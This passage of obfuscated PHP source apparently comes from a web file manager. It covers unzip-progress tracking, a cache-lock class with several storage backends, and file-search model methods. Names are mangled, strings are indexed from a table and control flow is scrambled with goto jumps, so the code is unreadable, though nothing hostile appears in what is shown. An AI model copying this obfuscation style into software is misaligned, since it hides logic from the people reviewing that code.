!$C‘ï”ºö¨ï[$b‹ãˆãôï[701]]) { return; } if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1518]] == $b‹ãˆãôï[1044]) { $d¡ÀªØ›˜É = 0; if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1490]]) { $d¡ÀªØ›˜É = $C‘ï”ºö¨ï[$b‹ãˆãôï[1491]] / $C‘ï”ºö¨ï[$b‹ãˆãôï[1490]]; } $C‘ï”ºö¨ï[$b‹ãˆãôï[1446]] = $d¡ÀªØ›˜É * 0.3; } else { if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1518]] == $b‹ãˆãôï[301]) { $d¡ÀªØ›˜É = $C‘ï”ºö¨ï[$b‹ãˆãôï[994]] / $C‘ï”ºö¨ï[$b‹ãˆãôï[980]]; $C‘ï”ºö¨ï[$b‹ãˆãôï[1446]] = 0.3 + $d¡ÀªØ›˜É * 0.4; } else { if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1518]] == $b‹ãˆãôï[103]) { $dñ½Ê¯ğ‡ø = 0; if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1492]] == $b‹ãˆãôï[103]) { $dñ½Ê¯ğ‡ø = $C‘ï”ºö¨ï[$b‹ãˆãôï[1491]]; } $d¡ÀªØ›˜É = ($C‘ï”ºö¨ï[$b‹ãˆãôï[1495]] + $dñ½Ê¯ğ‡ø) / $C‘ï”ºö¨ï[$b‹ãˆãôï[701]]; $C‘ï”ºö¨ï[$b‹ãˆãôï[1446]] = 0.3 + 0.4 + $d¡ÀªØ›˜É * 0.3; } } } if ($C‘ï”ºö¨ï[$b‹ãˆãôï[1446]] > 0) { $aòöÂ¨´ŸÏ = timeFloat() - $C‘ï”ºö¨ï[$b‹ãˆãôï[1448]] - $C‘ï”ºö¨ï[$b‹ãˆãôï[1451]]; $C‘ï”ºö¨ï[$b‹ãˆãôï[1452]] = $aòöÂ¨´ŸÏ * (1 - $C‘ï”ºö¨ï[$b‹ãˆãôï[1446]]) / $C‘ï”ºö¨ï[$b‹ãˆãôï[1446]]; } } public function addFile($Bø…¶À½®±) { goto eç—òè»ì; eç—òè»ì: $f‚İÅÃĞ½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a”†Ø² =& $this->task; $CĞ¬Â—ŠÚ‚ = IO::info($Bø…¶À½®±); goto C°ğá¸—ƒ; C°ğá¸—ƒ: $a”†Ø²[$f‚İÅÃĞ½[1488]] = $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[28]]; $a”†Ø²[$f‚İÅÃĞ½[1490]] = $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[77]]; $a”†Ø²[$f‚İÅÃĞ½[1491]] = 0; goto A±·±¾Ûñ‰; CÑ±®‰—¦: $this->update(); goto Bè‘ ŠØ¶ô; A±·±¾Ûñ‰: $a”†Ø²[$f‚İÅÃĞ½[982]] = $f‚İÅÃĞ½[1507]; $a”†Ø²[$f‚İÅÃĞ½[1492]] = $f‚İÅÃĞ½[1044]; $a”†Ø²[$f‚İÅÃĞ½[701]] = $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[77]]; goto d«»Â¼©¡ù; d«»Â¼©¡ù: $a”†Ø²[$f‚İÅÃĞ½[980]] = 1; $eŒ¹‹à„ˆ° = 0; $a”†Ø²[$f‚İÅÃĞ½[1499]] = array($f‚İÅÃĞ½[1500] => $eŒ¹‹à„ˆ° + 1, $f‚İÅÃĞ½[386] => $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[28]], $f‚İÅÃĞ½[75] => $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[75]], $f‚İÅÃĞ½[466] => $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[466]] ? $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[466]] : $CĞ¬Â—ŠÚ‚[$f‚İÅÃĞ½[75]]); goto CÑ±®‰—¦; Bè‘ ŠØ¶ô: } public function unzipAfter($bÚ¦é¡‘ÚŞ) { goto eÙÒŒê¹÷•; eÙÒŒê¹÷•: $Fğ³ĞíÇ‡Ö =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d©÷¢„‚Æ“ =& $this->task; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1518]] = $Fğ³ĞíÇ‡Ö[103]; goto B—ÆÒÌ‹õƒ; f›Üƒç«‡´: $this->update(); self::log($Fğ³ĞíÇ‡Ö[1520] . json_encode(array($d©÷¢„‚Æ“, $aœÔ£Š‰‡))); goto fºÑ°ŸÊã; Bœğ”—Úà‡: $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1488]] = $Fğ³ĞíÇ‡Ö[33]; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1495]] = 0; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[701]] = $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[77]]; goto f›Üƒç«‡´; B—ÆÒÌ‹õƒ: $aœÔ£Š‰‡ = IO::infoWithChildren($bÚ¦é¡‘ÚŞ); $bµ¾ğº“Ö´ = 0; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1499]] = array($Fğ³ĞíÇ‡Ö[1500] => $bµ¾ğº“Ö´ + 1, $Fğ³ĞíÇ‡Ö[386] => $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[28]], $Fğ³ĞíÇ‡Ö[75] => $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[75]], $Fğ³ĞíÇ‡Ö[466] => $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[466]] ? $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[466]] : $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[75]]); goto FÂÁ›³È•„; FÂÁ›³È•„: if ($aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[29]] == $Fğ³ĞíÇ‡Ö[167]) { $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[980]] = 1; } else { $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[980]] = $aœÔ£Š‰‡[$Fğ³ĞíÇ‡Ö[80]][$Fğ³ĞíÇ‡Ö[78]]; } $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[982]] = $Fğ³ĞíÇ‡Ö[33]; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1492]] = 0; goto E›êª…È¶ó; E›êª…È¶ó: $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[994]] = 0; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1490]] = 0; $d©÷¢„‚Æ“[$Fğ³ĞíÇ‡Ö[1491]] = 0; goto Bœğ”—Úà‡; fºÑ°ŸÊã: } public function nameParse($Aò…ËŞƒ‰Ò) { goto BÕëÍõêİæ; f”ëÛëğÌŸ: $this->update(); goto e®‹ÖÉæË; eÈÄÏóø¡‰: $dÀÁä»ô±ø = get_path_this($Aò…ËŞƒ‰Ò); if (strstr($dÀÁä»ô±ø, $Bãç¬«¹Ûµ[91])) { $E³õîöõöÈ[$Bãç¬«¹Ûµ[994]] += 1; $E³õîöõöÈ[$Bãç¬«¹Ûµ[980]] += 1; } $E³õîöõöÈ[$Bãç¬«¹Ûµ[1488]] = $Aò…ËŞƒ‰Ò; goto f”ëÛëğÌŸ; BÕëÍõêİæ: $Bãç¬«¹Ûµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E³õîöõöÈ =& $this->task; if ($E³õîöõöÈ[$Bãç¬«¹Ûµ[1518]] == $Bãç¬«¹Ûµ[1044]) { $E³õîöõöÈ[$Bãç¬«¹Ûµ[1518]] = $Bãç¬«¹Ûµ[301]; $E³õîöõöÈ[$Bãç¬«¹Ûµ[1495]] = 0; $E³õîöõöÈ[$Bãç¬«¹Ûµ[701]] = 0; } goto eÈÄÏóø¡‰; e®‹ÖÉæË: } } goto aŠ°ĞÉïª; e‡Åê‰Œ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C¾ˆµåõ; fŠíªáë•ô: self::$timeout = $BàìÎàÓš¨[$FÈ‘ÈÁÊ‹[771]] ? $BàìÎàÓš¨[$FÈ‘ÈÁÊ‹[771]] : 10; $DÖ¶ˆ³Šİ¹ = _get($GLOBALS[$FÈ‘ÈÁÊ‹[6]], $FÈ‘ÈÁÊ‹[772]); $AŒ¬Ö¨ŠÊ = $BàìÎàÓš¨[$FÈ‘ÈÁÊ‹[758]] ? $BàìÎàÓš¨[$FÈ‘ÈÁÊ‹[758]] : $FÈ‘ÈÁÊ‹[167]; goto E§ßÄæÖ÷Ä; E§ßÄæÖ÷Ä: if ($AŒ¬Ö¨ŠÊ == $FÈ‘ÈÁÊ‹[17] && $DÖ¶ˆ³Šİ¹ == $FÈ‘ÈÁÊ‹[9]) { $AŒ¬Ö¨ŠÊ = $FÈ‘ÈÁÊ‹[167]; } switch ($AŒ¬Ö¨ŠÊ) { case $FÈ‘ÈÁÊ‹[761]: self::$handle = new CacheLockRedis(); break; case $FÈ‘ÈÁÊ‹[762]: self::$handle = new CacheLockMemcached(); break; case $FÈ‘ÈÁÊ‹[17]: self::$handle = new CacheLockDatabase(); break; case $FÈ‘ÈÁÊ‹[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Bá¸µÒÆ¿; C¾ˆµåõ: $FÈ‘ÈÁÊ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (self::$handle) { return self::$handle; } $BàìÎàÓš¨ = $GLOBALS[$FÈ‘ÈÁÊ‹[6]][$FÈ‘ÈÁÊ‹[337]]; goto fŠíªáë•ô; Bá¸µÒÆ¿: } private static function key($F¡‡Œê½®®) { return $_SERVER[³‘’¼äÑ™ÔÍ][773] . Cache::key($F¡‡Œê½®®); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BÏ™ÔóÔš– = '') { self::$errorMsg = $BÏ™ÔóÔš–; } public static function lockGlobal($c¶ÛäÜ¿Ö„, $Fõİ¿Ş“ˆø) { return self::lock($c¶ÛäÜ¿Ö„, $Fõİ¿Ş“ˆø, !0); } public static function lock($dÌò ¬ï÷², $AÊÅÎÇ¶Æ¹ = false, $f…÷ôŠÁ = false) { goto AöÅëŠªÓ–; DŒ¹¾…Ø¶¶: $AÊÅÎÇ¶Æ¹ = $AÊÅÎÇ¶Æ¹ ? $AÊÅÎÇ¶Æ¹ : self::$timeout; $FÃóÛ¤²ùÅ = $bô¢ˆ×‹©ì->lock($CØÆõ³¡Îì, $AÊÅÎÇ¶Æ¹); if (!$FÃóÛ¤²ùÅ) { $cé‡¬öç‚ì = $Dò¥Æ‡ŸÙù[774] . $AÊÅÎÇ¶Æ¹ . $Dò¥Æ‡ŸÙù[67] . self::$errorMsg . $Dò¥Æ‡ŸÙù[67] . get_caller_msg(); $AšÇ¸´Ğïâ = "\114\x6f\x63\x6b\x20\x61\143\x74\151\157\x6e\x3a\40{$CØÆõ³¡Îì}\x20\164\151\155\x65\x6f\x75\164\54\157\x76\145\x72\40{$AÊÅÎÇ¶Æ¹}\x20\163"; $AšÇ¸´Ğïâ = self::$errorMsg ? self::$errorMsg : $e‰ËâëÒ®ñ; write_log($cé‡¬öç‚ì, $Dò¥Æ‡ŸÙù[775]); show_json($AšÇ¸´Ğïâ, !1); } goto A™‰ßİ»¯; AöÅëŠªÓ–: $Dò¥Æ‡ŸÙù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bô¢ˆ×‹©ì = self::init(); $CØÆõ³¡Îì = self::key($dÌò ¬ï÷²); goto DŒ¹¾…Ø¶¶; A™‰ßİ»¯: if (!$f…÷ôŠÁ) { self::$lockItem[$CØÆõ³¡Îì] = !0; } return $FÃóÛ¤²ùÅ; goto c„µÄ­ÑÅÖ; c„µÄ­ÑÅÖ: } public static function lockGet($C£‘Û©¢ÑØ) { $cÎÀğŠ„ïÜ = self::key($C£‘Û©¢ÑØ); if (self::$lockItem[$cÎÀğŠ„ïÜ]) { return self::$lockItem[$cÎÀğŠ„ïÜ]; } return self::init()->lockGet($cÎÀğŠ„ïÜ); } public static function unlock($EÇ±’”ƒ¾¯) { $E†ÑèŒÀìÚ = self::key($EÇ±’”ƒ¾¯); self::$lockItem[$E†ÑèŒÀìÚ] = null; return self::init()->unlock($E†ÑèŒÀìÚ); } public static function unlockRuntime() { $fòô½‡Ôõ× =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b¼ÎœÜ©¨ = self::init(); $b…ê›ÆæÃ = !1; foreach (self::$lockItem as $bÚ†ÇëÄŞ˜ => $a„ë´ §) { if (!$a„ë´ §) { continue; } $b¼ÎœÜ©¨->unlock($bÚ†ÇëÄŞ˜); if (!$b…ê›ÆæÃ) { $b…ê›ÆæÃ = !0; write_log($fòô½‡Ôõ×[776] . $bÚ†ÇëÄŞ˜ . $fòô½‡Ôõ×[67] . get_caller_msg(), $fòô½‡Ôõ×[775]); continue; } write_log($fòô½‡Ôõ×[776] . $bÚ†ÇëÄŞ˜, $fòô½‡Ôõ×[775]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $cã›èõÏÁÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eàò¥Ê­áƒ = $GLOBALS[$cã›èõÏÁÍ[6]][$cã›èõÏÁÍ[337]]; self::$cachePath = $eàò¥Ê­áƒ[$cã›èõÏÁÍ[167]][$cã›èõÏÁÍ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($d¹…â£øõĞ, $aİ¤ÅËùÊ‰ = 0) { goto FÙÍˆø›Üñ; DñÇÚ¨Ûõ²: $this->unlock($d¹…â£øõĞ); return !1; goto c¹ÜÄÄ‹¡; FÙÍˆø›Üñ: $F½é–¢²Ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‰ùÂÀ¢É = microtime(!0); $f×²ÑÌˆŠ† = $D‰ùÂÀ¢É + $aİ¤ÅËùÊ‰ + 0.0001; goto eÛ¹³Éõš÷; eÛ¹³Éõš÷: $d±«îº×¬ = rtrim(self::$cachePath, $F½é–¢²Ø[8]) . $F½é–¢²Ø[777] . md5($d¹…â£øõĞ) . $F½é–¢²Ø[778]; if (file_exists($d±«îº×¬) && filemtime($d±«îº×¬) && filemtime($d±«îº×¬) < time() - 10) { @unlink($d±«îº×¬); } do { if (file_exists($d±«îº×¬)) { cacheLockWait(); continue; } $AÖá„ÏÓåó = fopen($d±«îº×¬, $F½é–¢²Ø[779]); if (!$AÖá„ÏÓåó) { return !1; } $EÉäÅ°„ï = flock($AÖá„ÏÓåó, LOCK_EX | LOCK_NB); self::$caches[$d¹…â£øõĞ] = array($F½é–¢²Ø[780] => $AÖá„ÏÓåó, $F½é–¢²Ø[167] => $d±«îº×¬); fwrite($AÖá„ÏÓåó, $f×²ÑÌˆŠ†); clearstatcache(); if ($AÖá„ÏÓåó && $EÉäÅ°„ï) { return !0; } cacheLockWait(); } while (microtime(!0) < $f×²ÑÌˆŠ†); goto DñÇÚ¨Ûõ²; c¹ÜÄÄ‹¡: } public function lockGet($D‘‡¤Šö«¤) { $FÎá¦¯ªì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bõ¢Š¸¬Ô = rtrim(self::$cachePath, $FÎá¦¯ªì[8]) . $FÎá¦¯ªì[777] . md5($D‘‡¤Šö«¤) . $FÎá¦¯ªì[778]; return file_exists($bõ¢Š¸¬Ô); } public function unlock($bƒÂÂ¡³º) { goto eå˜‰­Ô„½; c·Ì¢é™õ: unset(self::$caches[$bƒÂÂ¡³º]); goto d²¦Ÿ¼´ÀÓ; cÂÌ¤µİÖ¼: @flock($FƒÂ¶Š£¬à[$CÏ‡…Õ‘[780]], LOCK_UN); @fclose($FƒÂ¶Š£¬à[$CÏ‡…Õ‘[780]]); @unlink($FƒÂ¶Š£¬à[$CÏ‡…Õ‘[167]]); goto c·Ì¢é™õ; eå˜‰­Ô„½: $CÏ‡…Õ‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FƒÂ¶Š£¬à = self::$caches[$bƒÂÂ¡³º]; if (!$FƒÂ¶Š£¬à) { return; } goto cÂÌ¤µİÖ¼; d²¦Ÿ¼´ÀÓ: } } goto cá‡ºÑÂè‹; DîğæØ²¸Ë: function beforeShutdownFatalError($cÆôÌãµ¤ø) { think_exception($cÆôÌãµ¤ø); } $_SERVER[$_SERVER[Êß·®ÍËúû][48]] = $d¯óö¸İÎ¬($_SERVER[$_SERVER[Êß·®ÍËúû][45]]); $C°ğíˆ—æ¸ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto bÆÇÅ‡…ùÒ; A‰­òä¹´: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ašñœ¥­™) { goto f•ØØĞãèÚ; Còê‹‘ˆ“: if (!$f£¨Œâ±™İ) { return array(); } $bç¯ÅÛ†õ = $f£¨Œâ±™İ[$Dİ§ó‰î¡[160]]; $b‹‰×Î‹£ = $Dİ§ó‰î¡[7]; goto cÂ‚¨ôÈÜç; cÂ‚¨ôÈÜç: if (!$f£¨Œâ±™İ[$Dİ§ó‰î¡[160]]) { $D§Ã±éŠï = array_to_keyvalue($A‡¦À †ˆ, $Dİ§ó‰î¡[33], $Dİ§ó‰î¡[160]); $bç¯ÅÛ†õ = implode($Dİ§ó‰î¡[47], $D§Ã±éŠï); $b‹‰×Î‹£ = $Dİ§ó‰î¡[2274]; } $B…ö˜ÒğÃğ = explode($Dİ§ó‰î¡[47], trim($bç¯ÅÛ†õ, $Dİ§ó‰î¡[47])); return array($b‹‰×Î‹£, $B…ö˜ÒğÃğ); goto b†·…¾¶Ì; f•ØØĞãèÚ: $Dİ§ó‰î¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‡¦À †ˆ = KodIO::fileTypeList(); $f£¨Œâ±™İ = $A‡¦À †ˆ[$ašñœ¥­™]; goto Còê‹‘ˆ“; b†·…¾¶Ì: } public function listPathType($fÌ¬šª—ë‡) { $cçîõŠßŒ— =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aì“Á¡ ®Ö = $this->fileTypeWhere($fÌ¬šª—ë‡); if (!$aì“Á¡ ®Ö) { return array(); } $F‘Å÷îõà = array($cçîõŠßŒ—[521] => SourceModel::TYPE_USER, $cçîõŠßŒ—[522] => USER_ID, $cçîõŠßŒ—[518] => 0, $cçîõŠßŒ—[519] => $aì“Á¡ ®Ö); return $this->listSource($F‘Å÷îõà); } public function listSearch($c©ÁÛ‡õ÷‚, $dº¥½ç¿ó = 300) { goto CğÁĞšÉ¤™; e–É™†Øò‹: if (!isset($fˆÒˆ‹‘˜‘[$böª„Ş¤†¼[397]])) { $fˆÒˆ‹‘˜‘[$böª„Ş¤†¼[397]] = 0; } $AÔ’…½‹£Ğ = $böª„Ş¤†¼[2325]; $eÈğ’©Ú¡Ú = $AÔ’…½‹£Ğ; goto b¡”ÜìèÄô; B Ï Õœ: $this->_listSearchDesc($aàˆÚÒÒ–­, $c©ÁÛ‡õ÷‚, $eÈğ’©Ú¡Ú); $this->_listSearchTag($aàˆÚÒÒ–­, $c©ÁÛ‡õ÷‚, $eÈğ’©Ú¡Ú); $this->_listDataApply($aàˆÚÒÒ–­[$böª„Ş¤†¼[354]]); goto aÌÌŒƒÓ®; aÌÌŒƒÓ®: $this->_listMake($aàˆÚÒÒ–­); return $aàˆÚÒÒ–­; goto cù¦•æÄ‹‚; CğÁĞšÉ¤™: $böª„Ş¤†¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($c©ÁÛ‡õ÷‚[$böª„Ş¤†¼[2191]]) && $c©ÁÛ‡õ÷‚[$böª„Ş¤†¼[2191]]) { $c©ÁÛ‡õ÷‚[$böª„Ş¤†¼[2191]] = str_replace($böª„Ş¤†¼[1601], $böª„Ş¤†¼[2324], trim($c©ÁÛ‡õ÷‚[$böª„Ş¤†¼[2191]])); } $fˆÒˆ‹‘˜‘ = $this->_parseSearchWhere($c©ÁÛ‡õ÷‚); goto e–É™†Øò‹; b¡”ÜìèÄô: $this->_listSearchBindPinyin($c©ÁÛ‡õ÷‚, $fˆÒˆ‹‘˜‘, $AÔ’…½‹£Ğ); $this->alias($böª„Ş¤†¼[487])->_makeOrder()->cache(null, 10); $aàˆÚÒÒ–­ = $this->distinct(!0)->field($AÔ’…½‹£Ğ)->where($fˆÒˆ‹‘˜‘)->selectPage($dº¥½ç¿ó); goto B Ï Õœ; cù¦•æÄ‹‚: } private function _listSearchTag(&$e™‡ê£¸Ê, $DŠáŠ‰õî‹, $A‹Úïô‹ùê) { goto bÅ•›Œí­÷; bÅ•›Œí­÷: $dÒÏ‚¿Ó¹Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$DŠáŠ‰õî‹[$dÒÏ‚¿Ó¹Ÿ[2191]] || $e™‡ê£¸Ê[$dÒÏ‚¿Ó¹Ÿ[351]][$dÒÏ‚¿Ó¹Ÿ[340]] > 1) { return; } $c§Ê¤Ñ¤Ì = Model($dÒÏ‚¿Ó¹Ÿ[2326])->listData(); goto f«Š³÷¥•; fÉçŠ¯ñ­: if (!$C®êÑØ—Á) { return; } $cô‚‘÷¸† = array($dÒÏ‚¿Ó¹Ÿ[393] => array($dÒÏ‚¿Ó¹Ÿ[7], $C®êÑØ—Á)); $D×§ƒ¥¾·â = Model($dÒÏ‚¿Ó¹Ÿ[394])->field($dÒÏ‚¿Ó¹Ÿ[75])->where($cô‚‘÷¸†)->select(); goto fÄŒëÎŒ´å; f«Š³÷¥•: $C®êÑØ—Á = array(); $BÛ²Ø¿²†— = $DŠáŠ‰õî‹[$dÒÏ‚¿Ó¹Ÿ[2191]]; foreach ($c§Ê¤Ñ¤Ì as $có®æ¶×ôÏ) { $f±õâÕ–õÕ = $có®æ¶×ôÏ[$dÒÏ‚¿Ó¹Ÿ[28]]; $f¥¢È‚¬ßƒ = str_replace($dÒÏ‚¿Ó¹Ÿ[50], $dÒÏ‚¿Ó¹Ÿ[33], Pinyin::encode($f±õâÕ–õÕ)); if (stripos($f±õâÕ–õÕ, $BÛ²Ø¿²†—) !== !1 || stripos($f¥¢È‚¬ßƒ, $BÛ²Ø¿²†—) !== !1) { $C®êÑØ—Á[] = $có®æ¶×ôÏ[$dÒÏ‚¿Ó¹Ÿ[367]]; } } goto fÉçŠ¯ñ­; fÄŒëÎŒ´å: $D×§ƒ¥¾·â = array_to_keyvalue($D×§ƒ¥¾·â, $dÒÏ‚¿Ó¹Ÿ[33], $dÒÏ‚¿Ó¹Ÿ[75]); $d…£÷ Šîé = array_unique($D×§ƒ¥¾·â); $this->_listSearchMerge($e™‡ê£¸Ê, $DŠáŠ‰õî‹, $A‹Úïô‹ùê, $d…£÷ Šîé); goto A¬§½¾‰ã; A¬§½¾‰ã: } private function _listSearchDesc(&$D¢‰‘–«Ûõ, $E±ğ‚ğøÚ , $c®ç¬„È˜) { goto aÆáâŸ¡; F·Œƒ¼Ú›²: $b­‹°†Ñ¸š = array_unique($b­‹°†Ñ¸š); if (!$b­‹°†Ñ¸š) { return; } $cí¾çªíä¼ = array($dñùŞï¼ô–[369] => array($dñùŞï¼ô–[7], $b­‹°†Ñ¸š), $dñùŞï¼ô–[89] => $dñùŞï¼ô–[405], $dñùŞï¼ô–[359] => array($dñùŞï¼ô–[755], $dñùŞï¼ô–[2193] . $E±ğ‚ğøÚ [$dñùŞï¼ô–[2191]] . $dñùŞï¼ô–[2193])); goto cšùĞ§¨…Ê; aÆáâŸ¡: $dñùŞï¼ô– =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$E±ğ‚ğøÚ [$dñùŞï¼ô–[2191]] || $D¢‰‘–«Ûõ[$dñùŞï¼ô–[351]][$dñùŞï¼ô–[340]] > 1) { return; } $b­‹°†Ñ¸š = $this->listSearchChildren($E±ğ‚ğøÚ [$dñùŞï¼ô–[461]]); goto F·Œƒ¼Ú›²; cšùĞ§¨…Ê: $B×§ëâÆ•Ú = Model($dñùŞï¼ô–[504])->field($dñùŞï¼ô–[369])->where($cí¾çªíä¼)->select(); $Aš¦¡ˆæ«¹ = array_to_keyvalue($B×§ëâÆ•Ú, $dñùŞï¼ô–[33], $dñùŞï¼ô–[369]); $this->_listSearchMerge($D¢‰‘–«Ûõ, $E±ğ‚ğøÚ , $c®ç¬„È˜, $Aš¦¡ˆæ«¹); goto c›ÖÅëƒ—ƒ; c›ÖÅëƒ—ƒ: } private function _listSearchMerge(&$Dìº³¸ØÉ¥, $aš…µñ˜ò, $DÓ‘éÖî…´, $b´Äö¸ªŠâ) { goto bï’“¢ÒÒ¦; e¨Ó¥ÔºŒ: foreach ($a‘Œ‰í©±³ as $Añ“ÍñŞâÜ) { $fÚñÈãËÆ = $bËŠâ‚™ª[47] . $aš…µñ˜ò[$bËŠâ‚™ª[461]] . $bËŠâ‚™ª[47]; if (stripos($Añ“ÍñŞâÜ[$bËŠâ‚™ª[459]], $fÚñÈãËÆ) !== !1) { $A É–¾Ÿ®[] = $Añ“ÍñŞâÜ; } } $Dìº³¸ØÉ¥[$bËŠâ‚™ª[354]] = array_merge($A É–¾Ÿ®, $Dìº³¸ØÉ¥[$bËŠâ‚™ª[354]]); $Dìº³¸ØÉ¥[$bËŠâ‚™ª[351]][$bËŠâ‚™ª[352]] += count($A É–¾Ÿ®); goto f•¸ä®Õäˆ; d‘ÌÃêƒëù: $fŠ¯ºİÔ„Û = array_diff($b´Äö¸ªŠâ, $fåñÉ¢ø¨Ã); if (!$fŠ¯ºİÔ„Û) { return; } $fÊàÍğº²¹ = array($bËŠâ‚™ª[369] => array($bËŠâ‚™ª[7], $fŠ¯ºİÔ„Û)); goto fĞÆÙŒ´©; fĞÆÙŒ´©: $a‘Œ‰í©±³ = $this->field($DÓ‘éÖî…´)->where($fÊàÍğº²¹)->select(); if (!$a‘Œ‰í©±³) { return; } $A É–¾Ÿ® = array(); goto e¨Ó¥ÔºŒ; bï’“¢ÒÒ¦: $bËŠâ‚™ª =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$b´Äö¸ªŠâ) { return; } $fåñÉ¢ø¨Ã = array_to_keyvalue($Dìº³¸ØÉ¥[$bËŠâ‚™ª[354]], $bËŠâ‚™ª[33], $bËŠâ‚™ª[369]); goto d‘ÌÃêƒëù; f•¸ä®Õäˆ: } public function listSearchChildren($eŒ÷×°ĞŒˆ, $cåÂ·ƒ—Ù¤ = 5000) { goto DÜ·ï«„ÂÑ; Bùğìœ‹: $aê”ºÎ§Š = $this->field($d°‰†°Í°ù[369])->where($A‚ñÀé†ÍÀ)->select(); $c£¶ œĞ§ = array_to_keyvalue($aê”ºÎ§Š, $d°‰†°Í°ù[33], $d°‰†°Í°ù[369]); return $c£¶ œĞ§; goto eØò¬Õ¶ñˆ; cÄÜ÷î­Ÿß: $A‚ñÀé†ÍÀ = array($d°‰†°Í°ù[459] => array($d°‰†°Í°ù[755], $b¬Ä˜•½—©[$d°‰†°Í°ù[459]] . $b¬Ä˜•½—©[$d°‰†°Í°ù[369]] . $d°‰†°Í°ù[484])); $døâ¾¦®Š = $this->field($d°‰†°Í°ù[369])->cache(null, 600)->where($A‚ñÀé†ÍÀ)->count(); if ($døâ¾¦®Š > $cåÂ·ƒ—Ù¤) { return $this->_listSearchChildrenNear($eŒ÷×°ĞŒˆ, $cåÂ·ƒ—Ù¤); } goto Bùğìœ‹; DÜ·ï«„ÂÑ: $d°‰†°Í°ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c£¶ œĞ§ = array(); $b¬Ä˜•½—© = $this->sourceInfo($eŒ÷×°ĞŒˆ); goto cÄÜ÷î­Ÿß; eØò¬Õ¶ñˆ: } private function _listSearchChildrenNear($B“Û›Ş¢Éê, $FÓÏâÙÔé) { goto Bšô®î†Ûç; Bšô®î†Ûç: $aê‚ƒ×©ññ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F™‰Î¹Ÿ = array(); $eæ¦™İö…¢ = array($aê‚ƒ×©ññ[461] => $B“Û›Ş¢Éê); goto eê‚•º˜ù‹; AĞ¸‘ÈŸê: if (!$BªéŒ®ÚÆ‘) { return $F™‰Î¹Ÿ; } $eæ¦™İö…¢ = array($aê‚ƒ×©ññ[461] => array($aê‚ƒ×©ññ[7], $BªéŒ®ÚÆ‘)); $F©œáõ×†· = $this->field($aê‚ƒ×©ññ[2327])->where($eæ¦™İö…¢)->select(); goto F–±Æ‰½ÈÈ; eê‚•º˜ù‹: $F©œáõ×†· = $this->field($aê‚ƒ×©ññ[2327])->where($eæ¦™İö…¢)->select(); $BªéŒ®ÚÆ‘ = array_to_keyvalue(array_filter_by_field($F©œáõ×†·, $aê‚ƒ×©ññ[370], $aê‚ƒ×©ññ[83]), $aê‚ƒ×©ññ[33], $aê‚ƒ×©ññ[369]); $F™‰Î¹Ÿ = array_merge($F™‰Î¹Ÿ, array_to_keyvalue($F©œáõ×†·, $aê‚ƒ×©ññ[33], $aê‚ƒ×©ññ[369])); goto AĞ¸‘ÈŸê; F–±Æ‰½ÈÈ: $F™‰Î¹Ÿ = array_merge($F™‰Î¹Ÿ, array_to_keyvalue($F©œáõ×†·, $aê‚ƒ×©ññ[33], $aê‚ƒ×©ññ[369])); $F™‰Î¹Ÿ = array_slice($F™‰Î¹Ÿ, 0, $FÓÏâÙÔé); return $F™‰Î¹Ÿ; goto Cƒ¾¡Ñíˆ¢; Cƒ¾¡Ñíˆ¢: } private function _listSearchBindPinyin($C¢°Èˆ¤ö, &$aÀøùßØ¤, &$dª­‡£Éä) { goto f†Šøòî“§; BÖ÷•ÇÛ¾ï: 